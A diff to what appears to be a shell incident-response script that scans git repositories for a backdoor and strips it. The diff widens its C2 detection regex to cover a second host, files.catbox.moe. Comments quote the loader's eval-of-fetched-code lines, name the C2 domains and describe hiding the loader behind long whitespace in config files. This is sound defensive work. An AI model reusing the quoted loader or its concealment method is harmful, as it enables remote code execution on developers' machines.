@@ -56,9 +56,12 @@ FIXED_MAP=()                  # filled per repo: "tmpbranch:originalbranch"
 #                                  const proxy = (await import('node-fetch')).default;
 #                                  eval(await (await proxy(src)).text());
 C2_DOMAIN='auth-confirm-eight.vercel.app'
+# INC-2026-10-31 served its second stage from files.catbox.moe (the committed
+# one-line `.env` held AUTH_API_KEY=base64("https://files.catbox.moe/<id>.js")).
+C2_RE='auth-confirm-eight\.vercel\.app|files\.catbox\.moe'
 # Signature of the eval()/C2 backdoor specifically (everything except the loader
 # marker). Used to strip/remove it when there is no clean ancestor to restore.
-EVAL_C2_RE='auth-confirm-eight\.vercel\.app|AUTH_API_KEY|Auth Error!|atob[[:space:]]*\([[:space:]]*process\.env'
+EVAL_C2_RE="$C2_RE|AUTH_API_KEY|Auth Error!|atob[[:space:]]*\\([[:space:]]*process\\.env"
 # INC-2026-10-31 variant: the same loader without the `_$_` marker, hidden after
 # ~31k spaces on ONE line of a config file (astro/postcss/… .config.mjs) and of a
 # dropped `init` module, plus the payload itself disguised as a Font Awesome file
@@ -286,7 +289,7 @@ ioc_labels() {
   git grep -qIE '_\$_' "$ref" 2>/dev/null && out="$out loader"
   git grep -qIE "$LOADER2_RE" "$ref" 2>/dev/null && out="$out loader-v2"
   git grep -qIE "$DROPPER_RE" "$ref" 2>/dev/null && out="$out dropper"
-  git grep -qI "$C2_DOMAIN" "$ref" 2>/dev/null && out="$out C2-url"
+  git grep -qIE "$C2_RE" "$ref" 2>/dev/null && out="$out C2-url"
   git grep -qI 'AUTH_API_KEY' "$ref" 2>/dev/null && out="$out AUTH_API_KEY"
   { git grep -qI 'Auth Error!' "$ref" 2>/dev/null \
     || git grep -qIE 'atob[[:space:]]*\([[:space:]]*process\.env' "$ref" 2>/dev/null; } \
@@ -822,7 +825,7 @@ done
 #     signature, and KEEP the file (it is legitimate/needed — never deleted,
 #     even if the strip leaves it empty). Excises the brace-matched
 #     `(async () => { … })();` block; every other line is left untouched.
-eval_re='auth-confirm-eight\.vercel\.app|AUTH_API_KEY|Auth Error!|atob[[:space:]]*\([[:space:]]*process\.env'
+eval_re='auth-confirm-eight\.vercel\.app|files\.catbox\.moe|AUTH_API_KEY|Auth Error!|atob[[:space:]]*\([[:space:]]*process\.env'
 grep -rIlE "$eval_re" . 2>/dev/null | while IFS= read -r f; do
   [ -f "$f" ] || continue
   awk '
